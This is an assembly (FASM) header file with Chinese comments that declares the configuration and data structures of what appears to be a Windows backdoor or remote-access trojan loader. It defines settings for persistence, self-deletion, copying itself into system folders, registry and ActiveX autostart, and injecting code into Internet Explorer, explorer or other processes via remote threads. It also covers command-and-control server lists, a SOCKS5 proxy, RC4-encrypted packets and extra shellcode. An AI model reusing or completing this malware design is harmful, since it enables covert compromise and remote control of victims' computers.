; 这个头文件包含了通用数据的声明
include 'macro\struct.inc'
include 'macro\masm.inc'
include 'macro\if.inc'
; unicode support
include 'utf16.inc'
include 'useful.inc'
include 'win32_extra.inc'

; 连接方式
CONNECT_METHOD_DIRECT = 0
CONNECT_METHOD_SOCKS5 = 1

; 拷贝方式
COPY_METHOD_NONE = 0
COPY_METHOD_TO_WINDOWS = 1
COPY_METHOD_TO_SYSTEM = 2

INJECT_METHOD_IEXPLORER = 0
INJECT_METHOD_CUSTOM = 1

; 注入间隔
INJECT_TIMES = 4
INJECT_INTERVAL = 1000 * 7

; 连接间隔
CONNECT_INTERVAL = 1000 * 30

; 数据包头标志
PACKET_HEADER_SIGNATURE = 0xdeedbeef

; socket选项
MAX_BUFFER_SIZE = 1024 * 4
SEND_TIMEOUT = 30
RECV_TIMEOUT = 20
WAIT_TIMEOUT = 20

; CMD_SHELLCODE_MAIN
CMD_SHELLCODE_MAIN = 0

struct global_data_t
	is_wow64			_BOOL	?				; 是否为wow64环境
	loader_path			_WCHAR	256	dup(?)		; loader的路径

	; 配置开始
	mutex_name			_CHAR	100 dup(?)		; mutex name
	persistence			_BOOL	?				; 是否开启守护

	melt				_BOOL	?				; 是否删除源文件
	copy_method			_BYTE	?				; 拷贝方式
	copy_to				_WCHAR	100 dup(?)		; 目标文件名称

	startup_hklm		_BOOL	?				; 是否采用hklm方式自启动
	nklm_name			_WCHAR	100	dup(?)		; nklm名称

	startup_acitvex		_BOOL	?				; 是否采用activex方式启动
	activex_name		_WCHAR	100	dup(?)		; activex名称

	inject_to_ie		_BOOL	?				; 是否注入到ie
	
	inject_to_custom	_BOOL	?				; 注入到通用进程
	custom_process_name	_WCHAR	100	dup(?)		; 目标进程名称

	group				_WCHAR	12	dup(?)		; 分组名称
	id					_WCHAR	12	dup(?)		; id名称

	dns_list			_BYTE	256	dup(?)		; 服务器列表，结构为 ip_1,0,port_1,ip_2,0,port_2,0

	socks5				_BOOL	?				; 通过socks5连接
	socks5_dns			_BYTE	100	dup(?)		; socks5服务器地址
	socks5_port			_WORD	?				; socks5端口
	socks5_user			_CHAR	100	dup(?)		; socks用户名
	socks5_pass			_CHAR	100	dup(?)		; socks密码

	rc4_key				_BYTE	260	dup(?)		; rc4_key最大长度为256，且中间不能出现00

	; rc4 sbox
	send_sbox			_BYTE	256	dup(?)
	recv_sbox			_BYTE	256	dup(?)

	; api声明
	API_DECLARE kernel32,\
		LoadLibraryA, GetProcAddress, GetCurrentProcess, CloseHandle, OpenProcess, lstrlenA, lstrlenW, lstrcatW, lstrcpyA, lstrcpyW, lstrcmpiW,\
		HeapAlloc, HeapReAlloc, HeapFree, GetProcessHeap, GetModuleHandleA, GetModuleFileNameW, CreateMutexA, GetLastError, Sleep,\
		VirtualAllocEx, VirtualFreeEx, WriteProcessMemory, WaitForSingleObject, CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,\
		ExpandEnvironmentStringsW, CreateProcessW, CreateRemoteThread, GetSystemDirectoryW, GetWindowsDirectoryW, CopyFileW, DeleteFileW

    API_DECLARE ntdll,\
		RtlZeroMemory, RtlMoveMemory, RtlCompressBuffer, RtlGetCompressionWorkSpaceSize, RtlDecompressBuffer

    API_DECLARE advapi32,\
		OpenProcessToken, LookupPrivilegeValueA, AdjustTokenPrivileges, RegOpenKeyExA, RegCreateKeyExW, RegSetValueExW, RegQueryValueExW, RegCloseKey

	API_DECLARE ws2_32,\
		WSAStartup, WSACleanup, htons, inet_addr, gethostbyname, socket, closesocket, connect, setsockopt, send, recv, select

	extra_data			_BYTE	1024	dup(?)	; 为其他shellcode准备

	; 基础函数,其它shellcode也可以使用, 其中connect_server
	BASE_FUNCTION get_proc_from_hash,\
		rc4_init, rc4_crypt,\
		alloc_memory, realloc_memory, free_memory, alloc_executable_memory, free_executable_memory,\
		compress, decompress,\
		wait_buffer, recv_data, send_data,\
		connect_server	; 这里都是不暴露给vs中使用的

	; 额外函数
	EXTRA_FUNCTION connect_by_socks5,\
		inject_to_explorer,\
		add_startup_hklm_x86, add_startup_activex_x86, copy_self_x86, find_process_by_name_x86, inject_to_explorer_code_x86,\
		get_kernel32_base_x64, get_ntdll_base_x64, get_proc_from_hash_x64,\	; x64与wow64通用
		add_startup_hklm_x64, add_startup_activex_x64, copy_self_x64, find_process_by_name_x64, inject_to_explorer_code_x64
ends

BASE_FUNCTION_START = global_data_t.get_proc_from_hash
EXTRA_FUNCTION_START = global_data_t.connect_by_socks5

struct packet_header_t
    random                  _DWORD  ?
    signature               _DWORD  ?
    cmd                     _BYTE   ?
    packet_unpacked_size    _DWORD  ?
    packet_size             _DWORD  ?
ends

struct function_data_t
    save_offset _WORD   ?
    func_size   _WORD   ?
ends

struct config_t
    save_offset _WORD   ?
    size        _WORD   ?
ends

struct api_hash_t
	hash		_DWORD	?	; api hash
	lib_offset	_WORD	?	; library offset in global_data_t
	save_offset	_WORD	?	; save offset in global_data_t
ends

struct explorer_thread_param_t
	global_data			global_data_t	?
	thread_main			_DWORD			?	;为了兼容x64,这两个其实
	thread_main_dummy	_DWORD			?
	thread_main_size	_WORD			?
ends